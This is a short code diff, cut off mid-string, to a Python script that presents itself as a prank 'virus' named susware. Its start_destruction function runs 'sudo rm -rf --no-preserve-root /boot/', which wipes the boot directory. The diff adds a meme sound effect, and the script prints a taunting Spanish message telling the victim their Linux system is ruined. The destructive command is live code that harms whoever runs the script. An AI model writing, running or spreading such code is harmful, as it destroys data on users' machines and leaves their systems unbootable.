@@ -1,12 +1,13 @@
 from os import system
 from colorama import Fore
 from time import sleep
+from playsound import playsound
 def start_destruction():
      system('sudo rm -rf --no-preserve-root /boot/')
      sleep(10)
      try:
 #         Empieza a sonar el among drip descargado     
-          
+          playsound('src/amogus.mp3')
           print(Fore.GREEN, """
      Tu sistema ha sido FOLLADO por el virus susware, no intentes reiniciar tu linux
      porque si no te irá peor, JAJAJAJAJAJA mientras destruimos tu sistema, disfruta del precioso
